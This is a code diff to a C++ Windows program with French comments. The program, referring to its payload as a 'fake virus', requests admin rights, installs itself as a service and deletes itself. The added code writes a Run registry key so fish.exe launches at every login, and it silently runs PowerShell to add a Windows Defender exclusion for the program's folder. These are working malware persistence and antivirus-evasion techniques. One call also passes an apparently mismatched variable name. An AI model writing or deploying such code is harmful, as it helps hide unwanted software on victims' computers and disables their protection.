@@ -132,6 +132,39 @@ bool InstallService(const string& serviceName, const string& exePath) {
     return true;
 }
 
+// Fonction pour éxécuter fish au démarrage
+void AddToStartup() {
+    HKEY hKey;
+    const char* regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+    const char* appName = "fish";
+    char szPath[MAX_PATH];
+
+    // Récupère la variable d'environnement %USERPROFILE%
+    if (GetEnvironmentVariableA("USERPROFILE", szPath, MAX_PATH)) {
+        strcat_s(szPath, "\\fish\\fish.exe");  // Construit le chemin complet
+
+        // Ouvre la clé de registre pour modification
+        if (RegOpenKeyExA(HKEY_CURRENT_USER, regPath, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+            // Ajoute ou met à jour l'entrée
+            RegSetValueExA(hKey, appName, 0, REG_SZ, (BYTE*)szPath, strlen(szPath) + 1);
+            RegCloseKey(hKey);
+        }
+    }
+}
+
+// Fonction qui ajoute une exclusion à windows defender
+void AddDefenderExclusion(const string& folderPath) {
+    string command = "powershell -Command \"Set-MpPreference -ExclusionPath '" + folderPath + "'\"";
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+
+    if (CreateProcessA(NULL, (LPSTR)command.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+}
+
+
 int main() {
 
     RequestAdminPrivileges();
@@ -170,6 +203,14 @@ int main() {
 
     // Installer le service Windows
     InstallService("fish", fakeVirusPath);
+
+    // Ajouter au démarrage
+    AddToStartup();
+
+    cout << fakeVirusPath << endl;
+
+    // Ajouter une exclusion antivirus
+    AddDefenderExclusion(fakeVirusPaths);
 
     // S'auto-supprimer
     SelfDelete();
